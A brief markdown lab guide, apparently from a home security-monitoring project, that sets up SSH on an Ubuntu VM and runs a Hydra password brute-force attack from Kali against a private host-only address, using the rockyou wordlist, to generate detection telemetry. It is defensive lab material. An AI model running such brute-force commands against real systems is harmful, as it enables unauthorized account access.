
### D) Hydra demo (attacks/hydra/steps.md)
> Run brute force against **Ubuntu over Host-Only** for clean internal telemetry.

```markdown
# Hydra SSH Brute Force Demo

## Preparation (Ubuntu)
Ensure SSH is enabled:
```bash
sudo apt update
sudo apt install -y openssh-server
sudo systemctl enable --now ssh

**Attack (Kali → Ubuntu Host-Only)**
hydra -l testuser -P /usr/share/wordlists/rockyou.txt ssh://192.168.117.128 -t 4
